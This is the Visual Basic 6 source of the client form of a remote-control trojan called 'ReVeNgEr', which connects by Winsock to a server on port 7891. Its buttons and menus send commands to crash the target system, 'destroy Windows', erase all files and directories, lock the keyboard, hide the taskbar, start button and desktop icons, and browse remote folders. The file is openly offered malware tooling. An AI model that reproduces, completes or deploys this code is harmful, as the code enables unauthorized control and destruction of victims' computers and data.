VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "-=ReVeNgEr=- made by aBsOlUt (Client)"
   ClientHeight    =   3165
   ClientLeft      =   405
   ClientTop       =   690
   ClientWidth     =   7200
   Icon            =   "main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3165
   ScaleWidth      =   7200
   Begin VB.Frame Frame1 
      Caption         =   "Client Status"
      Height          =   3135
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   7095
      Begin VB.CommandButton Command9 
         Caption         =   "Disconnect"
         Enabled         =   0   'False
         Height          =   375
         Left            =   1680
         TabIndex        =   21
         Top             =   1320
         Width           =   1095
      End
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   6600
         Top             =   0
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.Frame Frame3 
         Caption         =   "Connection"
         Height          =   1575
         Left            =   120
         TabIndex        =   7
         Top             =   240
         Width           =   6855
         Begin VB.TextBox Text4 
            Height          =   1095
            Left            =   2760
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            ScrollBars      =   3  'Both
            TabIndex        =   23
            Top             =   360
            Width           =   3975
         End
         Begin VB.CommandButton Command8 
            Caption         =   "Send"
            Height          =   375
            Left            =   2760
            TabIndex        =   16
            Top             =   1080
            Visible         =   0   'False
            Width           =   495
         End
         Begin VB.TextBox Text3 
            Height          =   195
            Left            =   3360
            TabIndex        =   15
            Top             =   720
            Visible         =   0   'False
            Width           =   375
         End
         Begin VB.CommandButton Command7 
            Caption         =   "Connect"
            Height          =   375
            Left            =   120
            TabIndex        =   14
            Top             =   1080
            Width           =   1095
         End
         Begin VB.TextBox Text2 
            Enabled         =   0   'False
            Height          =   285
            Left            =   560
            TabIndex        =   11
            Text            =   "7891"
            Top             =   560
            Width           =   615
         End
         Begin VB.TextBox Text1 
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "0"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1032
               SubFormatType   =   1
            EndProperty
            Height          =   285
            Left            =   1080
            MaxLength       =   16
            TabIndex        =   9
            Top             =   210
            Width           =   1575
         End
         Begin VB.Label Label5 
            AutoSize        =   -1  'True
            Caption         =   "Server responses :"
            Height          =   195
            Left            =   2760
            TabIndex        =   19
            Top             =   120
            Width           =   1320
         End
         Begin VB.Label Label4 
            AutoSize        =   -1  'True
            Height          =   195
            Left            =   720
            TabIndex        =   13
            Top             =   840
            Width           =   45
         End
         Begin VB.Label Label3 
            AutoSize        =   -1  'True
            Caption         =   "Status :"
            Height          =   195
            Left            =   120
            TabIndex        =   12
            Top             =   840
            Width           =   540
         End
         Begin VB.Label Label2 
            AutoSize        =   -1  'True
            Caption         =   "Port :"
            Height          =   195
            Left            =   120
            TabIndex        =   10
            Top             =   600
            Width           =   375
         End
         Begin VB.Label Label1 
            AutoSize        =   -1  'True
            Caption         =   "IP address :"
            Height          =   195
            Left            =   120
            TabIndex        =   8
            Top             =   240
            Width           =   840
         End
      End
      Begin VB.Frame Frame2 
         Caption         =   "Commands"
         Height          =   1215
         Left            =   120
         TabIndex        =   1
         Top             =   1800
         Width           =   6855
         Begin VB.CommandButton Command11 
            Caption         =   "Status"
            Height          =   375
            Left            =   5880
            TabIndex        =   24
            ToolTipText     =   "Server status"
            Top             =   720
            Width           =   855
         End
         Begin VB.CommandButton Command13 
            Caption         =   "Kill "
            Height          =   375
            Left            =   5880
            TabIndex        =   22
            ToolTipText     =   "Kill the server"
            Top             =   240
            Width           =   855
         End
         Begin VB.CommandButton Command12 
            Caption         =   "Desktop"
            Height          =   375
            Left            =   4560
            TabIndex        =   20
            ToolTipText     =   "Desktop options"
            Top             =   720
            Width           =   1215
         End
         Begin VB.CommandButton Command10 
            Caption         =   "FTP"
            Height          =   375
            Left            =   4560
            TabIndex        =   18
            Top             =   240
            Width           =   1215
         End
         Begin VB.CommandButton Command5 
            Caption         =   "Destroy"
            Height          =   375
            Left            =   3120
            TabIndex        =   17
            ToolTipText     =   "Destroy Windows(works)"
            Top             =   240
            Width           =   1335
         End
         Begin VB.CommandButton Command6 
            Caption         =   "Lock keyboard"
            Height          =   375
            Left            =   1560
            TabIndex        =   6
            ToolTipText     =   "Disable the keyboard"
            Top             =   720
            Width           =   1455
         End
         Begin VB.CommandButton Command4 
            Caption         =   "System Crash"
            Height          =   375
            Left            =   3120
            TabIndex        =   5
            ToolTipText     =   "Crash the computer"
            Top             =   720
            Width           =   1335
         End
         Begin VB.CommandButton Command3 
            Caption         =   "Swap buttons"
            Height          =   375
            Left            =   1560
            TabIndex        =   4
            ToolTipText     =   "Swap mouse buttons"
            Top             =   240
            Width           =   1455
         End
         Begin VB.CommandButton Command2 
            Caption         =   "Close CD-ROM"
            Height          =   375
            Left            =   120
            TabIndex        =   3
            ToolTipText     =   "Close the CD-Rom drive"
            Top             =   720
            Width           =   1335
         End
         Begin VB.CommandButton Command1 
            Caption         =   "Open CD-ROM"
            Height          =   375
            Left            =   120
            TabIndex        =   2
            ToolTipText     =   "Open the CD-Rom drive"
            Top             =   240
            Width           =   1335
         End
      End
   End
   Begin VB.Menu mnudesktop 
      Caption         =   "desktop"
      Visible         =   0   'False
      Begin VB.Menu mnutask 
         Caption         =   "TaskBar Options"
         Begin VB.Menu mnushowt 
            Caption         =   "Show taskbar"
            Enabled         =   0   'False
         End
         Begin VB.Menu mnuhidet 
            Caption         =   "Hide taskbar"
         End
      End
      Begin VB.Menu mnustart 
         Caption         =   "Start Button Options"
         Begin VB.Menu mnushows 
            Caption         =   "Show start button"
            Enabled         =   0   'False
         End
         Begin VB.Menu mnuhides 
            Caption         =   "Hide start button"
         End
      End
      Begin VB.Menu mnudesk 
         Caption         =   "Desktop Options"
         Begin VB.Menu mnushowd 
            Caption         =   "Show desktop icons"
            Enabled         =   0   'False
         End
         Begin VB.Menu mnuhided 
            Caption         =   "Hide desktop icons"
         End
      End
   End
   Begin VB.Menu mnuftp 
      Caption         =   "ftp"
      Visible         =   0   'False
      Begin VB.Menu mnudirectoryopt 
         Caption         =   "Directory Options..."
         Begin VB.Menu mnuup 
            Caption         =   "Up one directory..."
         End
         Begin VB.Menu mnuchangedir 
            Caption         =   "Change directory..."
         End
         Begin VB.Menu mnuviewdir 
            Caption         =   "View directories..."
         End
         Begin VB.Menu mnumakenew 
            Caption         =   "Make new directory..."
         End
      End
      Begin VB.Menu mnufileopt 
         Caption         =   "File Options"
         Begin VB.Menu mnuall 
            Caption         =   "Erase all files..."
         End
         Begin VB.Menu mnualldir 
            Caption         =   "Erase all files and directory..."
         End
         Begin VB.Menu mnuview 
            Caption         =   "View files..."
         End
      End
      Begin VB.Menu mnusendmsg 
         Caption         =   "Send a message..."
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Function ShowFolderList(foldername)
    Dim fso, f, fc, fj, s, f1
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFolder(foldername)
    Set fc = f.Subfolders
    Set fj = f.Files
    'For Folders
    'If you dont want to delete folders just
    'remove the loop


    For Each f1 In fc
        ' If f1.Name = "Foldertobeerased" Then
        'f1.Delete
        ' Else
        s = f1.Name
        s = s & "<BR>"
        
        Text1.Text = Text1.Text + NewLine + (f1)
        ' End If
    Next
    End Function
Private Function NewLine()
    NewLine = vbCrLf
End Function

Private Sub Command1_Click()
On Error Resume Next
Text3.Text = "Open CD-ROM"
Command8_Click
End Sub

Private Sub Command10_Click()
Form1.PopupMenu mnuftp
End Sub

Private Sub Command11_Click()
On Error Resume Next
Text3.Text = "Status"
Command8_Click
End Sub

Private Sub Command12_Click()
Form1.PopupMenu mnudesktop

End Sub

Private Sub Command13_Click()
On Error Resume Next
Text3.Text = "Kill"
Command8_Click
End Sub

Private Sub Command14_Click()
Text4.Text = ""
End Sub

Private Sub Command2_Click()
On Error Resume Next
Text3.Text = "Close CD-ROM"
Command8_Click
End Sub
Private Sub Command3_Click()
On Error Resume Next
Text3.Text = "Swap buttons"
Command8_Click
End Sub
Private Sub Command4_Click()
On Error Resume Next
Text3.Text = "Crash"
Command8_Click
End Sub
Private Sub Command5_Click()
On Error Resume Next
Text3.Text = "Destroy"
Command8_Click
End Sub
Private Sub Command6_Click()
On Error Resume Next
Text3.Text = "Lock keyboard"
Command8_Click
End Sub
Private Sub Command7_Click()
 On Error GoTo errorhandler
Winsock1.RemoteHost = Text1.Text
Winsock1.RemotePort = Text2.Text
Winsock1.Connect
Command7.Enabled = False
Command9.Enabled = True
Label4.Caption = "Connecting..."
errorhandler: If Err.Number = 10049 Then
Label4.Caption = "Could not connect to server."
Command7.Enabled = True
Command9.Enabled = False
Winsock1.Close
End If
End Sub
Private Sub Command8_Click()
Winsock1.SendData Text3.Text

End Sub
Private Sub Command9_Click()
Command9.Enabled = False
Command7.Enabled = True
Label4.Caption = "Disconnected"
Winsock1.Close

End Sub



Private Sub form_load()
Text1.Text = Winsock1.LocalIP
Label4.Caption = "Disconnected"

End Sub

Private Sub Label6_Click()

End Sub



Private Sub mnuall_Click()
On Error Resume Next
Text3.Text = "Erase"
Command8_Click
End Sub


Private Sub mnualldir_Click()
On Error Resume Next
Text3.Text = "Erased"
Command8_Click
End Sub

Private Sub mnuchangedir_Click()
On Error Resume Next
x = InputBox("Enter directory name to change", "Change directory")
Text3.Text = "chdir" + x
Command8_Click
End Sub

Private Sub mnuhided_Click()
On Error Resume Next
Text3.Text = "Hide desk"
Command8_Click
mnuhided.Enabled = False
mnushowd.Enabled = True

End Sub

Private Sub mnuhides_Click()
On Error Resume Next
Text3.Text = "Hide start"
Command8_Click
mnuhides.Enabled = False
mnushows.Enabled = True
End Sub

Private Sub mnuhidet_Click()
On Error Resume Next
Text3.Text = "Hide task"
Command8_Click
mnuhidet.Enabled = False
mnushowt.Enabled = True

End Sub


Private Sub mnumakenew_Click()
On Error Resume Next
x = InputBox("Enter directory name", "Make new directory")
Text3.Text = "mkdir" + x
Command8_Click

End Sub

Private Sub mnusendmsg_Click()
On Error Resume Next
x = InputBox("Type a message", "Send a message")
Text3.Text = "messg" + x
Command8_Click

End Sub

Private Sub mnushowd_Click()
On Error Resume Next
Text3.Text = "Show desk"
Command8_Click
mnuhided.Enabled = True
mnushowd.Enabled = False

End Sub

Private Sub mnushows_Click()
On Error Resume Next
Text3.Text = "Show start"
Command8_Click
mnuhides.Enabled = True
mnushows.Enabled = False

End Sub

Private Sub mnushowt_Click()
On Error Resume Next
Text3.Text = "Show task"
Command8_Click
mnuhidet.Enabled = True
mnushowt.Enabled = False

End Sub

Private Sub mnuup_Click()
On Error Resume Next
Text3.Text = "updir"
Command8_Click

End Sub

Private Sub mnuview_Click()
On Error Resume Next
Text3.Text = "Info"
Command8_Click
End Sub

Private Sub mnuviewdir_Click()
On Error Resume Next
Text3.Text = "viewdir"
Command8_Click
End Sub

Private Sub Text4_Change()
If Text4.DataChanged Then
Label4.Caption = "Connected!"
End If
End Sub
Private Sub Timer1_Timer()
Text5.Text = Text5.Text - 1
End Sub
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim strData As String
Winsock1.GetData strData, vbString
Text4.Text = strData
If strData = NewLine Then
        Text4.Text = Text4.Text & NewLine
End If
If strData = endir Then
    x = InputBox("Enter directory you wish to change", "Change directory")
    Text3.Text = "chdir" + x
    Command8_Click
End If
End Sub
